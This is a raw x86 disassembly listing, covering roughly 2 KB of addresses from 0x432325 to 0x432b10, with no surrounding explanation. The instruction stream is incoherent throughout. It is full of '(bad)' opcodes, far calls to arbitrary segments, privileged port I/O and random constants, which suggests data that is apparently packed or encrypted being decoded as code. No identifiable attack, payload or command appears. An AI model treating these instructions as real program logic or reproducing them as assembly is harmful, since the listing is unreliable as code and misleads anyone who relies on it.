  432325:	or     esi,DWORD PTR [ebx+ebp*1-0x69]
  432329:	popa   
  43232a:	jecxz  0x4322e5
  43232c:	push   es
  43232d:	ficomp DWORD PTR [edx-0x33854406]
  432333:	cvtps2pi mm3,QWORD PTR [ecx-0x25]
  432337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432338:	and    DWORD PTR [eax],edi
  43233a:	jmp    0xbbe02faa
  43233f:	or     DWORD PTR [edx+0x56cc0ff3],ebp
  432345:	enter  0x9ca2,0x12
  432349:	pop    ebx
  43234a:	call   0xe1a4:0x83810a54
  432351:	std    
  432352:	call   0x1b7c:0xd47c5c72
  432359:	jns    0x43232a
  43235b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43235c:	popf   
  43235d:	add    bh,BYTE PTR ss:[eax]
  432360:	inc    ebp
  432361:	fldenv ds:0xf2a79787
  432367:	jns    0x4322f1
  432369:	pop    edx
  43236a:	bound  esp,QWORD PTR [edi+0x1b19865b]
  432370:	jae    0x43237f
  432372:	hlt    
  432373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432374:	or     ecx,DWORD PTR [edx-0x20]
  432377:	and    DWORD PTR [esi],0xffffff91
  43237a:	test   al,0xd3
  43237c:	mov    dl,0xde
  43237e:	jnp    0x43232d
  432380:	loop   0x43230c
  432382:	mov    fs,WORD PTR [ebx+eiz*8]
  432385:	and    esi,DWORD PTR ds:0x540e24e5
  43238b:	or     DWORD PTR [eax+0x74],esp
  43238e:	and    BYTE PTR [edi-0x65],0x60
  432392:	rcl    DWORD PTR [edx+esi*4-0x46],1
  432396:	mov    edi,0xbcd0ddb4
  43239b:	dec    ebx
  43239c:	pop    esp
  43239d:	or     ch,al
  43239f:	cmp    bl,BYTE PTR [ebx-0x80]
  4323a2:	sbb    cl,cl
  4323a4:	adc    al,al
  4323a6:	pop    ebx
  4323a7:	gs mov dl,0xea
  4323aa:	mov    ah,0xb2
  4323ac:	mov    edi,0xf48cc8b3
  4323b1:	or     dh,BYTE PTR [edx-0x22]
  4323b4:	aam    0x24
  4323b6:	ss push ebx
  4323b8:	mov    eax,ds:0x8e3b264b
  4323bd:	fcomp  QWORD PTR [edx+0x2438426b]
  4323c3:	push   cs
  4323c4:	push   ebx
  4323c5:	push   ds
  4323c6:	jb     0x432366
  4323c8:	or     dh,0x1a
  4323cb:	dec    eax
  4323cc:	xor    esp,DWORD PTR [ebx]
  4323ce:	push   edi
  4323cf:	pop    ebx
  4323d0:	mov    ebx,0xbd3f9a99
  4323d5:	pop    esi
  4323d6:	stc    
  4323d7:	mov    bh,0x4a
  4323d9:	mov    al,ds:0x9b38a655
  4323de:	aad    0xd6
  4323e0:	xor    DWORD PTR [ebp+0x46],ecx
  4323e3:	(bad)  
  4323e4:	mov    esp,0x486600ce
  4323e9:	mul    DWORD PTR [ecx-0x2b]
  4323ec:	mov    ch,0xc3
  4323ee:	outs   dx,BYTE PTR ds:[esi]
  4323ef:	sar    BYTE PTR [esi+0x75],0x8b
  4323f3:	in     eax,0xe8
  4323f5:	pop    ebx
  4323f6:	outs   dx,BYTE PTR ds:[esi]
  4323f7:	push   eax
  4323f8:	dec    ebx
  4323f9:	or     edi,DWORD PTR [ebp-0x3c]
  4323fc:	test   eax,0xb623064a
  432401:	adc    bl,BYTE PTR [edx+0x7a868b9c]
  432407:	xchg   edi,eax
  432408:	and    eax,DWORD PTR [edx+0x661aa7c2]
  43240e:	xchg   ebx,eax
  43240f:	fistp  WORD PTR [esi]
  432411:	push   0xffffffd8
  432413:	xor    al,0xb2
  432415:	xor    DWORD PTR [esi+0x649bc5ab],ecx
  43241b:	test   ebp,esi
  43241d:	or     eax,DWORD PTR [eax]
  43241f:	cmp    eax,DWORD PTR [esi]
  432421:	stos   DWORD PTR es:[edi],eax
  432422:	ds inc edi
  432424:	jg     0x432461
  432426:	call   0xc612:0xfbd73b67
  43242d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43242e:	xor    DWORD PTR [ecx-0x585b2308],edi
  432434:	jge    0x43242d
  432436:	push   edi
  432437:	dec    eax
  432438:	jae    0x4323ee
  43243a:	call   0xfa4c:0x178d692c
  432441:	inc    esi
  432442:	xchg   esp,eax
  432443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432444:	jecxz  0x4324c3
  432446:	aam    0xfe
  432448:	movsx  eax,WORD PTR [esi]
  43244b:	bound  esi,QWORD PTR [edx-0x125e019f]
  432451:	lock sub eax,0x680b6d15
  432457:	retf   
  432458:	or     DWORD PTR [ecx],ebx
  43245a:	aam    0x34
  43245c:	mov    WORD PTR [esi-0x66],fs
  43245f:	mov    bl,0x6a
  432461:	int    0x6a
  432463:	pushw  es
  432465:	cs aas 
  432467:	mov    al,ds:0x9e06c5eb
  43246c:	push   ebp
  43246d:	fst    DWORD PTR [eax-0x11]
  432471:	setp   BYTE PTR [ecx-0x7a791810]
  432478:	fcmovnu st,st(5)
  43247a:	popa   
  43247b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43247c:	pop    eax
  43247e:	push   edx
  43247f:	mov    ss,WORD PTR [esp+esi*8]
  432482:	jb     0x432471
  432484:	sti    
  432485:	sbb    al,0x9b
  432487:	dec    esi
  432488:	mov    esi,0x5d37b5b4
  43248d:	adc    BYTE PTR [edx-0x58],0xdb
  432491:	or     edx,DWORD PTR [edi+0x40ef9bf3]
  432497:	outs   dx,DWORD PTR ds:[esi]
  432498:	ret    0xe09e
  43249b:	xchg   esi,eax
  43249c:	jnp    0x432425
  43249e:	mov    eax,ds:0x68ce5ea4
  4324a3:	inc    edi
  4324a4:	mov    dh,0x97
  4324a6:	aas    
  4324a7:	test   eax,0xb73c4db1
  4324ac:	xor    al,BYTE PTR [ebp-0x37]
  4324af:	add    BYTE PTR [edx-0x36],ah
  4324b2:	cwde   
  4324b3:	or     BYTE PTR ds:0xc942d261,0x8b
  4324ba:	adc    edx,DWORD PTR [esi+0x4d8f21f9]
  4324c0:	mov    ebp,0x29a017f5
  4324c5:	jecxz  0x432475
  4324c7:	sti    
  4324c8:	mov    al,0x5b
  4324ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4324cb:	out    dx,eax
  4324cc:	jns    0x432475
  4324ce:	out    0x7d,eax
  4324d0:	mov    cl,0x2d
  4324d2:	fs mov esi,0x5fdb5a8e
  4324d8:	inc    esp
  4324d9:	test   eax,0x952aa5f1
  4324de:	(bad)  
  4324df:	neg    DWORD PTR [edx]
  4324e1:	sub    edx,ebx
  4324e3:	push   ebx
  4324e4:	retf   0x9a06
  4324e7:	shr    BYTE PTR [eax],0x1c
  4324ea:	repnz bnd jg 0x4324ee
  4324ee:	jbe    0x432497
  4324f0:	or     dh,BYTE PTR [eax+0x7e5f90ae]
  4324f6:	ins    DWORD PTR es:[edi],dx
  4324f7:	push   esi
  4324f8:	mov    dl,0xc
  4324fa:	ret    0x5571
  4324fd:	mov    cl,0x5a
  4324ff:	(bad)  
  432500:	jne    0x43251b
  432502:	bound  ebp,QWORD PTR [edx-0x5368f101]
  432508:	cwde   
  432509:	retf   
  43250a:	cmc    
  43250b:	lods   eax,DWORD PTR ds:[esi]
  43250c:	cmp    bh,bl
  43250e:	out    0xf5,al
  432510:	mov    dl,0x82
  432512:	jp     0x4324ba
  432514:	popf   
  432515:	ins    DWORD PTR es:[edi],dx
  432516:	pop    ebx
  432517:	or     esp,DWORD PTR [ebx+eax*2+0x78]
  43251b:	test   eax,0x149c80b3
  432520:	xor    eax,DWORD PTR [eax+0x7c]
  432523:	xlat   BYTE PTR ds:[ebx]
  432524:	stos   DWORD PTR es:[edi],eax
  432525:	rcr    DWORD PTR [ebx+0x41fa9ad7],1
  43252b:	cmp    BYTE PTR [esi],bl
  43252d:	or     al,0x66
  43252f:	and    DWORD PTR [ebx+0x4696613],eax
  432535:	aad    0xbe
  432537:	and    dh,BYTE PTR [edx-0x626ed216]
  43253d:	dec    edi
  43253e:	in     eax,0x7c
  432540:	xlat   BYTE PTR ds:[ebx]
  432541:	or     al,0xf7
  432543:	jmp    0xdd49:0x474d3e23
  43254a:	mov    esp,0x6005b24d
  43254f:	push   edx
  432550:	lea    ecx,[eax+ebp*2]
  432553:	mov    esp,0xc0cb0cd2
  432558:	inc    ebp
  432559:	jns    0x432539
  43255b:	xlat   BYTE PTR ds:[ebx]
  43255c:	scas   al,BYTE PTR es:[edi]
  43255d:	xor    edx,esp
  43255f:	mov    cl,0xb2
  432561:	and    al,0x5
  432563:	dec    ebp
  432564:	xor    bh,dh
  432566:	pop    ebp
  432567:	add    eax,0xaefa0563
  43256c:	mov    esi,0x338e3ece
  432571:	mov    ecx,DWORD PTR [edi]
  432573:	loopne 0x4325cf
  432575:	pop    ebp
  432576:	sub    dh,ch
  432578:	mov    dl,0x72
  43257a:	nop    ebx
  43257d:	sub    BYTE PTR [ebp+ebp*1+0x1be20abd],dl
  432584:	loop   0x4325c9
  432586:	in     eax,0x71
  432588:	(bad)  
  432589:	(bad)  
  43258a:	sub    esp,esp
  43258c:	pushf  
  43258d:	jecxz  0x432538
  43258f:	aad    0xb2
  432591:	ret    
  432592:	mov    ebx,0x10a70c89
  432597:	fist   DWORD PTR [ebp-0x276838f5]
  43259d:	ins    DWORD PTR es:[edi],dx
  43259e:	and    BYTE PTR [ebp-0x39],ch
  4325a1:	call   0xe952:0x6775559b
  4325a8:	(bad)  
  4325a9:	retf   
  4325aa:	dec    esi
  4325ab:	xor    DWORD PTR [ecx],esi
  4325ad:	push   ss
  4325ae:	inc    ecx
  4325af:	mov    ebx,0x2d530ba1
  4325b4:	in     al,0xa4
  4325b6:	jl     0x432622
  4325b8:	mov    bh,0xbf
  4325ba:	shl    BYTE PTR [ebx-0x4f],0xeb
  4325be:	pop    edx
  4325bf:	jecxz  0x43258a
  4325c1:	mov    ebp,0x4af0a9e5
  4325c6:	test   DWORD PTR ds:0xef6fb9b2,ecx
  4325cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4325cd:	mov    bh,0xa0
  4325cf:	xor    dh,BYTE PTR [edi]
  4325d1:	xchg   ebp,eax
  4325d2:	fst    DWORD PTR [eax-0x68e511d1]
  4325d8:	mov    bh,0x5e
  4325da:	mov    esp,cs
  4325dc:	adc    DWORD PTR [ebx],ecx
  4325de:	fstp   QWORD PTR [esi]
  4325e0:	popa   
  4325e1:	sbb    ecx,esi
  4325e3:	add    eax,0xb999c0cf
  4325e8:	ror    DWORD PTR [edi],cl
  4325ea:	sbb    eax,DWORD PTR [ecx]
  4325ec:	das    
  4325ed:	mov    ebx,0xa6eed70
  4325f2:	(bad)  
  4325f4:	aaa    
  4325f5:	outs   dx,BYTE PTR ds:[esi]
  4325f6:	call   0x5e2e5e3b
  4325fb:	xchg   edx,eax
  4325fc:	mov    ch,0x72
  4325fe:	add    eax,esi
  432600:	pop    ss
  432601:	loope  0x4325bd
  432603:	jae    0x432639
  432605:	pop    ecx
  432606:	shl    DWORD PTR [edi+0x1d8117b8],cl
  43260c:	add    al,0xe
  43260e:	stos   BYTE PTR es:[edi],al
  43260f:	mov    ah,0xb2
  432611:	push   esi
  432612:	ret    0xa0ab
  432615:	jmp    0x8a9ccfa
  43261a:	sbb    BYTE PTR [edx-0xe],cl
  43261d:	shr    DWORD PTR [ecx],0x79
  432620:	sbb    cl,bl
  432622:	rcl    DWORD PTR [eax],1
  432624:	mov    dl,0x81
  432626:	add    DWORD PTR [esi-0x3e],edi
  432629:	leave  
  43262a:	xchg   BYTE PTR [ebx-0x5f6aeb5d],ah
  432630:	mov    al,0xd7
  432632:	and    BYTE PTR [ebx+edx*1+0x52e5bbfc],0x47
  43263a:	pop    ds
  43263b:	jb     0x4325f0
  43263d:	aam    0x55
  43263f:	fbld   TBYTE PTR [ecx+0x20]
  432642:	or     BYTE PTR [edx+eiz*2-0x7d],bh
  432646:	mov    esp,0x761ab1a7
  43264b:	pop    edx
  43264c:	std    
  43264d:	xchg   DWORD PTR [esi],ecx
  43264f:	int    0xb2
  432651:	in     al,dx
  432652:	xchg   ebx,eax
  432653:	fldcw  WORD PTR [edx+0x30]
  432656:	nop
  432657:	add    BYTE PTR [ebx],0x5
  43265a:	mov    dh,0x7b
  43265c:	ret    
  43265d:	adc    eax,0xac2a3e1a
  432662:	clc    
  432663:	loop   0x4326bf
  432665:	sbb    BYTE PTR [ebp+0x4f8684ef],0xc3
  43266c:	adc    cl,bl
  43266e:	pop    edi
  43266f:	jmp    0x432684
  432671:	or     ecx,DWORD PTR ds:0x3a55c011
  432677:	mov    WORD PTR [ecx-0x2f],ss
  43267a:	call   0xc2b9:0xbba27548
  432681:	xor    DWORD PTR [ebx+0x1b1723a7],esi
  432687:	sub    ah,BYTE PTR [edx+0x3]
  43268a:	ins    DWORD PTR es:[edi],dx
  43268b:	clc    
  43268c:	mov    dl,0xdf
  43268e:	imul   ecx,DWORD PTR [esi+eax*1],0xffffffb7
  432692:	aam    0xe6
  432694:	fld    QWORD PTR [edx]
  432696:	retf   0xd34
  432699:	out    0x1d,eax
  43269b:	sub    eax,0x15fa8bde
  4326a0:	inc    ebp
  4326a1:	dec    ebp
  4326a2:	call   0x230:0xd2cd4da1
  4326a9:	call   0xd07a:0x3d5ca0a7
  4326b0:	mov    ds:0x300fd9eb,eax
  4326b5:	sbb    eax,0x2d009a7
  4326ba:	aad    0x20
  4326bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4326bd:	mov    esi,DWORD PTR [edi-0x69cdbd24]
  4326c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4326c4:	dec    edi
  4326c5:	or     ch,al
  4326c7:	ins    DWORD PTR es:[edi],dx
  4326c8:	push   ecx
  4326c9:	and    BYTE PTR [edi-0x7e404dae],dh
  4326cf:	sub    cl,dh
  4326d1:	(bad)
  4326d4:	pop    edx
  4326d5:	or     edi,DWORD PTR [ebx+0x108b953a]
  4326db:	add    BYTE PTR [edi-0x180e6571],bh
  4326e1:	xor    al,0x88
  4326e3:	loopne 0x43272b
  4326e5:	or     eax,0x7919a7d3
  4326ea:	fs jmp 0x432707
  4326ed:	iret   
  4326ee:	stos   DWORD PTR es:[edi],eax
  4326ef:	pop    ss
  4326f0:	mov    ch,0xee
  4326f2:	fidivr DWORD PTR [ebx+0x5fa3def]
  4326f8:	test   DWORD PTR [ebx+0x6b],esi
  4326fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4326fc:	aam    0x18
  4326fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4326ff:	addr16 mov ah,0x4e
  432702:	xchg   esp,eax
  432703:	push   ebx
  432704:	mov    dl,0x3f
  432706:	mov    esp,0x4da82a95
  43270b:	mov    DWORD PTR [ebx-0x68b586f5],edx
  432711:	xchg   ecx,eax
  432712:	pop    es
  432713:	lods   eax,DWORD PTR ds:[esi]
  432714:	and    BYTE PTR ds:[edx-0x647f1ce4],bl
  43271b:	inc    ebx
  43271c:	cmp    DWORD PTR [ecx],0xd8bea62c
  432722:	in     al,dx
  432723:	fwait
  432724:	sahf   
  432725:	bnd jmp 0xcc6c5412
  43272b:	pusha  
  43272c:	mov    dl,0xf5
  43272e:	stc    
  43272f:	mov    ah,BYTE PTR [ebp+0x31c3f389]
  432735:	xor    dl,ch
  432737:	stos   DWORD PTR es:[edi],eax
  432738:	sub    al,0xaa
  43273a:	gs out 0x25,eax
  43273d:	push   eax
  43273e:	shl    cl,cl
  432740:	xor    BYTE PTR [edx-0x3a5cc577],0x9a
  432747:	sbb    al,0xef
  432749:	pusha  
  43274a:	call   0x374ed86e
  43274f:	cmp    edx,ebp
  432751:	cmp    bh,BYTE PTR [edi-0x60e09c7a]
  432757:	pop    ebx
  432758:	retf   0x6eb6
  43275b:	mov    cl,0x72
  43275d:	push   eax
  43275e:	int    0xac
  432760:	dec    edx
  432761:	add    eax,0x38ed9f87
  432766:	enter  0x54a7,0x1f
  43276a:	sbb    bh,0x70
  43276d:	xchg   ecx,eax
  43276e:	call   0xf869:0x63ebf04
  432775:	add    eax,0x7739a7cd
  43277a:	mov    eax,ds:0x84437e1b
  43277f:	das    
  432780:	mov    bl,0xfc
  432782:	push   0xe94c1d27
  432787:	inc    eax
  432788:	dec    edx
  432789:	push   ss
  43278a:	adc    DWORD PTR [eax+0x4b580849],esp
  432790:	(bad)  
  432791:	imul   ecx,edx,0x37
  432794:	outs   dx,DWORD PTR ds:[esi]
  432795:	add    ebx,DWORD PTR [ebx+0x6f3bf882]
  43279b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43279c:	fidivr DWORD PTR [edx]
  43279e:	pop    edx
  43279f:	sahf   
  4327a0:	dec    esi
  4327a1:	xor    edi,DWORD PTR [ecx]
  4327a3:	mov    BYTE PTR [edx],dh
  4327a5:	jns    0x432734
  4327a7:	jmp    0x4327e4
  4327a9:	push   0x35b2fa5b
  4327ae:	cmp    al,0x43
  4327b0:	lds    ebx,FWORD PTR [esi+0x45]
  4327b3:	lock data16 ja 0x4327bf
  4327b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4327b8:	sub    DWORD PTR [esi+0x664ec30c],ebx
  4327be:	add    esp,DWORD PTR [ecx-0x45339e4b]
  4327c4:	test   BYTE PTR [edx+0x2a],bh
  4327c7:	rcl    DWORD PTR [edx+0xf],1
  4327ca:	pop    edi
  4327cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4327cc:	inc    ecx
  4327cd:	fcomp  DWORD PTR [edi-0x6b2153ba]
  4327d3:	fidiv  DWORD PTR [edx-0x41484d59]
  4327d9:	dec    ecx
  4327da:	clc    
  4327db:	mov    edx,0x6c08177d
  4327e0:	fmul   st(3),st
  4327e2:	jnp    0x432855
  4327e4:	and    al,0xa8
  4327e6:	je     0x4327f0
  4327e8:	mov    dl,0x2
  4327ea:	push   ss
  4327eb:	fldpi  
  4327ed:	stos   DWORD PTR es:[edi],eax
  4327ee:	jno    0x43284b
  4327f0:	aad    0xb
  4327f2:	lods   eax,DWORD PTR ds:[esi]
  4327f3:	stos   BYTE PTR es:[edi],al
  4327f4:	fnstcw WORD PTR [ecx+0x33e11c3f]
  4327fa:	call   0xc396:0x77bf35e2
  432801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432802:	loop   0x4327a8
  432804:	ins    BYTE PTR es:[edi],dx
  432805:	mov    ecx,DWORD PTR [edi+0x615553e9]
  43280b:	in     eax,dx
  43280c:	pop    ebp
  43280d:	imul   esp,DWORD PTR [ebx-0x65c180b0],0x2
  432814:	js     0x4327c9
  432816:	popa   
  432817:	fld    TBYTE PTR [ebx-0x56583142]
  43281d:	sub    al,0x45
  43281f:	test   eax,0xafb2205
  432824:	mov    bh,0x29
  432826:	stos   BYTE PTR es:[di],al
  432828:	fistp  WORD PTR gs:[edx]
  43282b:	clc    
  43282c:	mov    bh,0xf0
  43282e:	lods   eax,DWORD PTR ds:[esi]
  43282f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432830:	inc    ebp
  432831:	cwde   
  432832:	cmp    DWORD PTR [edi],ecx
  432834:	xchg   edi,eax
  432835:	test   eax,0xf5d397f8
  43283a:	call   0x3718:0x12885f27
  432841:	mov    cl,BYTE PTR [ecx-0x59]
  432844:	sbb    eax,0x4a7b599c
  432849:	je     0x4328ae
  43284b:	push   DWORD PTR [edx-0x1edcb0ed]
  432851:	loope  0x4328b8
  432853:	add    eax,0x96c4377a
  432858:	xor    ah,bl
  43285a:	mov    BYTE PTR [eax-0x41],dl
  43285d:	or     al,0xc3
  43285f:	call   0xa81397ee
  432864:	retf   
  432865:	add    ah,BYTE PTR [ecx+edx*1-0x5b]
  432869:	(bad)  
  43286b:	pop    edi
  43286c:	or     ecx,DWORD PTR [ebx]
  43286e:	jmp    0xa172:0x3288109b
  432875:	jns    0x432816
  432877:	add    BYTE PTR [ebx+0x727ffb57],ch
  43287d:	xlat   BYTE PTR ds:[ebx]
  43287e:	scas   al,BYTE PTR es:[edi]
  43287f:	mov    BYTE PTR [esi+0x4],al
  432882:	popa   
  432883:	push   0x74
  432885:	and    ebp,edi
  432887:	sub    BYTE PTR [edx-0x5],dh
  43288a:	pusha  
  43288b:	push   ecx
  43288c:	or     edx,edx
  43288e:	call   0x5130:0xd42b0c56
  432895:	jo     0x4328ff
  432897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432898:	popf   
  432899:	xchg   ch,ch
  43289b:	cli    
  43289c:	or     BYTE PTR [edi-0x7f],ah
  43289f:	aaa    
  4328a0:	lods   al,BYTE PTR ds:[esi]
  4328a1:	call   0xc63c:0x233168f9
  4328a8:	in     al,dx
  4328a9:	stos   DWORD PTR es:[edi],eax
  4328aa:	ret    0xeea1
  4328ad:	or     eax,DWORD PTR [eax+0xb]
  4328b0:	div    BYTE PTR ds:0xce983f8d
  4328b6:	fwait
  4328b7:	mov    ebx,0x4ee196d7
  4328bc:	mov    bl,0xdd
  4328be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4328bf:	data16 in al,0x2e
  4328c2:	cmc    
  4328c3:	pop    edi
  4328c4:	(bad)  
  4328c6:	call   0x5bf2:0x91e081fa
  4328cd:	mov    edi,0x84e0b539
  4328d2:	dec    ebp
  4328d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4328d4:	(bad)  
  4328d5:	sar    BYTE PTR [esi-0x650b0996],cl
  4328db:	mov    dh,0xf8
  4328dd:	jne    0x432872
  4328df:	loopne 0x43294d
  4328e1:	cli    
  4328e2:	ins    BYTE PTR es:[edi],dx
  4328e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4328e4:	push   ecx
  4328e5:	lsl    esp,WORD PTR [edx]
  4328e8:	icebp  
  4328e9:	inc    edi
  4328ea:	sub    eax,0x3932a903
  4328ef:	jbe    0x4328d9
  4328f1:	test   BYTE PTR [ecx+0x7a],bl
  4328f4:	mov    bl,0x8b
  4328f6:	imul   esi,DWORD PTR [ebp+0x47],0xb
  4328fa:	mov    edi,0x2e0053b9
  4328ff:	dec    edi
  432900:	rcl    bh,0x9a
  432903:	xlat   BYTE PTR ds:[ebx]
  432904:	aam    0x13
  432906:	lock cwde 
  432908:	add    cl,BYTE PTR [ecx+0x67]
  43290b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43290c:	xchg   ebp,eax
  43290d:	mov    bh,0xcb
  43290f:	loop   0x4328eb
  432911:	mov    esi,0xdb2ab1d
  432916:	enter  0xfc74,0x36
  43291a:	push   es
  43291b:	pop    ecx
  43291c:	ror    BYTE PTR [ebx],1
  43291e:	push   edi
  43291f:	outs   dx,DWORD PTR ds:[esi]
  432920:	inc    ebp
  432921:	jb     0x4328ae
  432923:	mov    al,ds:0x95eb074a
  432928:	mov    dl,0x25
  43292a:	test   BYTE PTR [esi+0x6c],0x70
  43292e:	mov    ebx,0xef0bc553
  432933:	sub    eax,0x3a5300b8
  432938:	adc    BYTE PTR [edx+ebx*4-0x79a9cad9],bh
  43293f:	repz out dx,al
  432941:	jb     0x4328eb
  432943:	mov    al,ds:0x89469e64
  432948:	dec    edx
  432949:	sbb    esi,DWORD PTR [edi-0x3c]
  43294c:	neg    BYTE PTR [edx-0x35839766]
  432952:	cmp    ebx,DWORD PTR [edx]
  432954:	mov    bh,0x2f
  432956:	or     eax,0xffda2a7
  43295b:	iret   
  43295c:	pop    ebp
  43295d:	shl    cl,0x53
  432960:	mov    dl,0x62
  432962:	inc    bp
  432964:	cmp    ebp,DWORD PTR [edx]
  432966:	fisub  WORD PTR [ecx+eiz*2+0xb]
  43296a:	mov    edi,0x8355ced5
  43296f:	jnp    0x432990
  432971:	mov    esi,0x2669629a
  432976:	mov    ebp,0x1b1f2ddd
  43297b:	pop    ss
  43297c:	int3   
  43297d:	add    al,0xe2
  43297f:	push   ss
  432980:	jecxz  0x43295c
  432982:	mov    edx,0x85c906c6
  432987:	jb     0x43293b
  432989:	adc    eax,0xeaab9566
  43298e:	cmp    al,0xe3
  432990:	leave  
  432991:	dec    ecx
  432993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432994:	jl     0x4329ac
  432996:	enter  0x1e40,0xa0
  43299a:	xchg   ecx,eax
  43299b:	mov    al,ds:0xcd0032b3
  4329a0:	xchg   BYTE PTR [eax-0xe8dfa3e],cl
  4329a6:	stos   DWORD PTR es:[edi],eax
  4329a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4329a8:	mov    bx,0x391b
  4329ac:	cmp    BYTE PTR ds:0xd053251a,ah
  4329b2:	push   0xf6c4ad3e
  4329b7:	dec    ebp
  4329b8:	loopne 0x432a32
  4329ba:	fwait
  4329bb:	add    esp,DWORD PTR [ecx]
  4329bd:	(bad)  
  4329bf:	mov    esi,0xacfcd15e
  4329c4:	pop    DWORD PTR [ebx-0x114d9b51]
  4329ca:	dec    esp
  4329cb:	ror    DWORD PTR [ebp-0x68],cl
  4329ce:	adc    esi,DWORD PTR fs:[edx+0x2bb4334]
  4329d5:	rcr    BYTE PTR ds:0x530bba5f,1
  4329db:	inc    esi
  4329dc:	mov    bl,0xe2
  4329de:	jle    0x432a2f
  4329e0:	ds out 0x94,eax
  4329e3:	clc    
  4329e4:	jb     0x4329b9
  4329e6:	fsub   QWORD PTR [edi+0x79b4ecf3]
  4329ec:	add    esi,DWORD PTR [eax]
  4329ee:	add    eax,ebp
  4329f0:	mov    dl,0x5e
  4329f2:	outs   dx,BYTE PTR ds:[esi]
  4329f3:	fidiv  WORD PTR [ebp-0x55540732]
  4329f9:	mov    dl,0xb2
  4329fb:	cld    
  4329fc:	dec    eax
  4329fd:	pop    ebx
  4329fe:	out    dx,al
  4329ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432a00:	mov    dh,0xa
  432a02:	jnp    0x4329ff
  432a04:	mov    ds:0xb28a2763,eax
  432a09:	(bad)  [edi+0x4c]
  432a0c:	jecxz  0x43299f
  432a0e:	fs (bad) 
  432a11:	or     edx,DWORD PTR [edi]
  432a13:	xchg   edi,eax
  432a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432a15:	scas   al,BYTE PTR es:[edi]
  432a16:	xchg   ebx,eax
  432a17:	xchg   DWORD PTR [esi-0x7e],esp
  432a1a:	call   0xb883:0x51bc8743
  432a21:	mov    ebx,0xaf08a7cb
  432a26:	popf   
  432a27:	leave  
  432a28:	inc    esi
  432a29:	fld    TBYTE PTR [edx+0x1fb0b5b6]
  432a2f:	or     edi,eax
  432a31:	jae    0x4329bd
  432a33:	mov    BYTE PTR [edx],bh
  432a35:	retf   0xa4ff
  432a38:	sub    bl,0xb6
  432a3b:	jbe    0x432a1c
  432a3d:	imul   esi,DWORD PTR [edx],0xffffffb6
  432a40:	jp     0x432a3b
  432a42:	call   0x604c:0x5aff00ad
  432a49:	xchg   edx,eax
  432a4a:	adc    eax,0xe93fdaa6
  432a4f:	xchg   ecx,eax
  432a50:	add    al,0x28
  432a52:	call   0x8ebe5fd5
  432a57:	mov    al,ds:0xc102c3b2
  432a5c:	adc    BYTE PTR [esi+ebx*2+0x110b6908],ch
  432a63:	and    al,0xda
  432a65:	call   0x86ffad19
  432a6a:	call   0xf6e6:0x50e94207
  432a71:	or     eax,0x7982b949
  432a76:	xchg   ebx,eax
  432a77:	lods   al,BYTE PTR es:[esi]
  432a79:	addr16 cli 
  432a7b:	hlt    
  432a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432a7d:	imul   edx,DWORD PTR [esi-0x2a3b4a41],0x3e
  432a84:	or     DWORD PTR [ebp-0x141b1c47],esi
  432a8a:	pop    ecx
  432a8b:	les    esp,FWORD PTR [edx+0xb]
  432a8e:	scas   eax,DWORD PTR es:[edi]
  432a8f:	sbb    ch,BYTE PTR [esi+eiz*1+0x487e498c]
  432a96:	call   0x93aa:0xb67f1930
  432a9d:	xlat   BYTE PTR ds:[ebx]
  432a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432aa0:	inc    esi
  432aa1:	imul   eax,DWORD PTR [eax+0x5a4b800b],0xc6821282
  432aab:	mov    ds:0xa6b4e9cb,al
  432ab0:	out    0x61,eax
  432ab2:	fwait
  432ab3:	mul    DWORD PTR [edx+0x72e2c7a0]
  432ab9:	pusha  
  432aba:	sub    esp,DWORD PTR [edi+0x55455f6b]
  432ac0:	dec    ecx
  432ac1:	repz xchg edi,eax
  432ac3:	les    ebp,FWORD PTR [ecx+ebp*4-0x698dd856]
  432aca:	scas   al,BYTE PTR es:[edi]
  432acb:	or     al,BYTE PTR [ebx+eax*8+0x28]
  432acf:	mov    eax,0xa7738241
  432ad4:	imul   esi,DWORD PTR [edx-0x6d1cad6f],0x6b13f09a
  432ade:	out    0x31,al
  432ae0:	lea    ebx,[esi-0x31a05b11]
  432ae6:	out    0x4e,eax
  432ae8:	out    dx,al
  432ae9:	in     al,dx
  432aea:	adc    cl,BYTE PTR [ebx-0x5b65041f]
  432af0:	int3   
  432af1:	fwait
  432af2:	mov    bl,0xb9
  432af4:	sbb    bh,cl
  432af6:	jp     0x432a9f
  432af8:	cmc    
  432af9:	(bad)  
  432afa:	loop   0x432ab8
  432afc:	mov    edi,0xb2385bb0
  432b01:	adc    DWORD PTR [esi+0x65],edx
  432b04:	mov    ah,0xa4
  432b06:	fs fs sahf 
  432b09:	or     cl,BYTE PTR [ebx]
  432b0b:	sub    ch,BYTE PTR [edx+0x1]
  432b0e:	popf   
  432b0f:	inc    ebx
  432b10:	stc    
